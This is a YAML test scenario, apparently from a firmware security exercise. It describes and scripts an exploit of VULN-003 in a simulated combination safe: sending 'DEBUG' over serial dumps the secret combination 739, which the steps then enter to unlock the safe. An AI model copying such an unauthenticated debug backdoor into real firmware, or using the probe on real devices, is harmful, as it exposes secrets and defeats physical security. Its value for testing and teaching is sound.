name: "VULN-003: Serial DEBUG backdoor leaks secret combination"
version: 1
vulnerability:
  type: backdoor
  severity: critical
  description: "Sending the string 'DEBUG' over the serial interface causes the firmware to dump internal state, including the secret combination digits in plaintext. There is no authentication required."
  exploit: "An attacker with physical or remote access to the serial interface (e.g., USB, UART pins, or a network-serial bridge) sends 'DEBUG' and receives the full combination, allowing immediate unlock."
  evidence: "The serial output contains '[debug] combo=739' revealing the secret combination is 7-3-9."
  line_numbers: [241, 242, 243, 244, 245]
steps:
  # Wait for boot
  - wait-serial: "=== COMBO SAFE v1.0 ==="
    timeout: 5000
  - delay: 1500

  # Send DEBUG command to trigger backdoor
  - clear-serial: true
  - delay: 500
  - send-serial: "DEBUG"
  - wait-serial: "[debug] === INTERNAL STATE ==="
    timeout: 5000
  - expect-serial: "[debug] combo=739"
  - expect-serial: "[debug] === END STATE ==="

  # Now use the leaked combo to unlock the safe
  - delay: 500

  # Digit 1 = 7
  - set-control:
      part-id: encoder1
      control: rotate-cw
      value: 7
  - delay: 200
  - set-control:
      part-id: encoder1
      control: pressed
      value: 1
  - delay: 100
  - set-control:
      part-id: encoder1
      control: pressed
      value: 0
  - delay: 500
  - wait-serial: "[input] Digit 1 = 7"
    timeout: 3000

  # Digit 2 = 3
  - set-control:
      part-id: encoder1
      control: rotate-cw
      value: 3
  - delay: 200
  - set-control:
      part-id: encoder1
      control: pressed
      value: 1
  - delay: 100
  - set-control:
      part-id: encoder1
      control: pressed
      value: 0
  - delay: 500
  - wait-serial: "[input] Digit 2 = 3"
    timeout: 3000

  # Digit 3 = 9
  - set-control:
      part-id: encoder1
      control: rotate-cw
      value: 9
  - delay: 200
  - set-control:
      part-id: encoder1
      control: pressed
      value: 1
  - delay: 100
  - set-control:
      part-id: encoder1
      control: pressed
      value: 0
  - delay: 500
  - wait-serial: "[safe] UNLOCKED!"
    timeout: 5000
  - expect-serial: "[check] CORRECT combo"
